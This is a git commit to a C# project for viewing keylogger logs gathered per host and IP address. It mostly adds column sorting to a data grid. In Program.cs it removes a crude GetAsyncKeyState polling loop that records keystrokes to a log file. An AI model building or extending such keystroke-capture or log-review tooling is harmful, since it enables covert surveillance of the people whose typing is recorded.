bf466b11d3fb22a99dd0c43e448331aab2382ed8
Anthony Baccuet <anba97@gmail.com>
2020-12-21 17:36:58 +0100

    tri possible

--- keyloggerviewer/Form1.cs
+++ keyloggerviewer/Form1.cs
@@ -16,6 +16,7 @@ namespace keyloggerviewer
         private DbLink db;
         private List<LogData> logs;
         private string sortedColumn;
+        private bool ascendSort;
         public Form1(DbLink connection)
         {
             InitializeComponent();
@@ -40,7 +41,8 @@ namespace keyloggerviewer
             cbType.DropDownStyle = ComboBoxStyle.DropDownList;
             logs = new List<LogData>();
             dataGridView1.DataSource = logs;
-            
+            ascendSort = true;
+            sortedColumn = "HostName";
         }
 
         private void bValidate_Click(object sender, EventArgs e)
@@ -64,12 +66,13 @@ namespace keyloggerviewer
             
             this.logs = db.simpleGet(hostName: hostName, type: logType, regex: regex, lineAfter: nbLineAfter,
                 lineBefore: nbLineBefore, contentMaxLen: contentMaxLen, contentMinLen: contentMinLen);
-            List<LogData> ld = this.logs.OrderBy(o => o.HostName).ThenBy(o => o.PrivateIp).ThenBy(o => o.PublicIp).ThenBy(o => o.LogId).ToList();;
+            List<LogData> ld = this.logs.OrderBy(o => o.HostName).ThenBy(o => o.LogId).ToList();;
             dataGridView1.DataSource = ld;
             dataGridView1.Update();
             dataGridView1.Refresh();
             sortedColumn = "HostName";
             dataGridView1.Columns[1].HeaderCell.SortGlyphDirection = SortOrder.Ascending;
+            
             
 
 
@@ -78,15 +81,82 @@ namespace keyloggerviewer
         private void dataGridView1_ColumnHeaderMouseClick(
             object sender, DataGridViewCellMouseEventArgs e)
         {
+            List<LogData> ld = this.logs;
             DataGridViewColumn newColumn = dataGridView1.Columns[e.ColumnIndex];
-            DataGridViewColumn oldColumn = dataGridView1.SortedColumn;
-            ListSortDirection direction;
+            DataGridViewColumn oldColumn = dataGridView1.Columns[this.sortedColumn];
             string head = newColumn.HeaderText;
-            if (head == this.sortedColumn)
+            bool ok = false;
+            if (head == this.sortedColumn && ascendSort)
             {
-                
+                Console.WriteLine("NOPE");
+                switch (head)
+                {
+                    case "LogId":
+                        ld = this.logs.OrderBy(o => o.HostName).ThenByDescending(o => o.LogId).ToList();
+                        ok = true;
+                        break;
+                    case "HostName":
+                        ld = this.logs.OrderByDescending(o => o.HostName).ThenBy(o => o.LogId).ToList();
+                        ok = true;
+                        break;
+                    case "Date":
+                        ld = this.logs.OrderByDescending(o => o.Date).ThenBy(o => o.HostName).ThenBy(o => o.LogId)
+                            .ToList();
+                        ok = true;
+                        break;
+                    case "Type":
+                        ld = this.logs.OrderByDescending(o => o.Type).ThenBy(o => o.HostName).ThenBy(o => o.LogId)
+                            .ToList();
+                        ok = true;
+                        break;
+                }
+
+                ascendSort = false;
+                newColumn.HeaderCell.SortGlyphDirection = SortOrder.Descending;
+            }
+            else
+            {
+                Console.WriteLine("OKK");
+                switch (head)
+                {
+                    case "LogId":
+                        ld = this.logs.OrderBy(o => o.HostName).ThenBy(o => o.LogId).ToList();
+                        ok = true;
+                        break;
+                    case "HostName":
+                        ld = this.logs.OrderBy(o => o.HostName).ThenBy(o => o.LogId).ToList();
+                        ok = true;
+                        break;
+                    case "Date":
+                        ld = this.logs.OrderBy(o => o.Date).ThenBy(o => o.HostName).ThenBy(o => o.LogId)
+                            .ToList();
+                        ok = true;
+                        break;
+                    case "Type":
+                        ld = this.logs.OrderBy(o => o.Type).ThenBy(o => o.HostName).ThenBy(o => o.LogId)
+                            .ToList();
+                        ok = true;
+                        break;
+                }
+
+                if (ok)
+                {
+                    ascendSort = true;
+                    
+                }
+
             }
 
+            if (ok)
+            {
+                dataGridView1.DataSource = ld;
+                dataGridView1.Columns[this.sortedColumn].HeaderCell.SortGlyphDirection = SortOrder.None;
+                if (ascendSort)
+                    dataGridView1.Columns[head].HeaderCell.SortGlyphDirection = SortOrder.Ascending;
+                else
+                    dataGridView1.Columns[head].HeaderCell.SortGlyphDirection = SortOrder.Descending;
+                sortedColumn = head;
+            }
 /*
             // If oldColumn is null, then the DataGridView is not sorted.
             if (oldColumn != null)
@@ -111,7 +181,6 @@ namespace keyloggerviewer
 */
             // Sort the selected column.
             //dataGridView1.Sort(newColumn, direction);
-            newColumn.HeaderCell.SortGlyphDirection = SortOrder.Descending;
         }
         
     }
--- keyloggerviewer/Program.cs
+++ keyloggerviewer/Program.cs
@@ -20,32 +20,11 @@ namespace keyloggerviewer
         public static extern int GetAsyncKeyState(Int32 i);
         static void Main()
         {
-            /*Application.SetHighDpiMode(HighDpiMode.SystemAware);
+            Application.SetHighDpiMode(HighDpiMode.SystemAware);
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             DbLink connection = new DbLink();
-            Application.Run(new Form1(connection));*/
-            string buf = "";
-            while (true)
-            {
-                Thread.Sleep(100);
-                for (int i = 0; i < 255; i++)
-                {
-                    int state = GetAsyncKeyState(i);
-                    if (state != 0)
-                    {
-                        buf += ((Keys)i).ToString();
-                        Console.WriteLine(buf);
-                        buf = "";
-                        if (buf.Length > 10)
-                        {
-                            File.AppendAllText("keylogger.log", buf);
-                            
-                            
-                        }
-                    }
-                }
-            }
+            Application.Run(new Form1(connection));
 
         }
     }
